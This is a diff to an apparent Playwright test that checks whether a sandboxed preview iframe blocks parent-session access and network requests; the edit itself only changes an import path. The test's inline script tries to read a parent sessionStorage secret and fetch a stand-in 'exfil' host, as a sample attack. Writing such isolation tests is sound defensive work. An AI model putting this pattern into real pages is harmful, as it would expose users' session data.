@@ -124,7 +124,7 @@ test('source studio generates, previews commerce, edits a file, restores and dow
 test('preview blocks access to parent session and network requests',async({page})=>{
   await page.goto('/?demo=1');
   const result=await page.evaluate(async()=>{
-    const {sourcePreviewDocument}=await import('/src/source-preview.ts' as string);
+    const {sourcePreviewDocument}=await import('/src/storefront-preview.ts' as string);
     sessionStorage.setItem('preview-test-secret','private');
     const html='<div id="result">pending</div><script>let parentBlocked=false;try{parent.sessionStorage.getItem("preview-test-secret")}catch{parentBlocked=true}fetch("https://example.invalid/exfil").then(()=>document.getElementById("result").textContent="network allowed").catch(()=>document.getElementById("result").textContent=parentBlocked?"isolated":"parent allowed")</script>';
     const frame=document.createElement('iframe');frame.sandbox.add('allow-scripts');frame.title='Isolation check';frame.srcdoc=sourcePreviewDocument({schemaVersion:1,brief:{},files:[{path:'index.html',content:html}]});document.body.append(frame);return true;
